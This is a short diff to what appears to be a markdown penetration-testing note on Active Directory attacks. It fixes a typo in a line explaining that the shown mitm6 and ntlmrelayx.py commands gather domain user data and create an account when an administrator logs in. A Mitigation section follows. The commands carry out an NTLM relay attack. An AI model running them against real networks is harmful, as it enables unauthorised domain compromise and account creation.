@@ -13,7 +13,7 @@ mitm6 -d arasaka.local
 ntlmrelayx.py -6 -t ldaps://192.168.1.100 -wh fakewpad.arasaka.local -l lootme
 ```
 
-This will gaher info about domain users and computers and store it on lottme folder, also will create user when it catches administator user logged into computer
+This will gather info about domain users and computers and store it on lottme folder, also will create user when it catches administator user logged into computer
 
 ### Mitigation
 
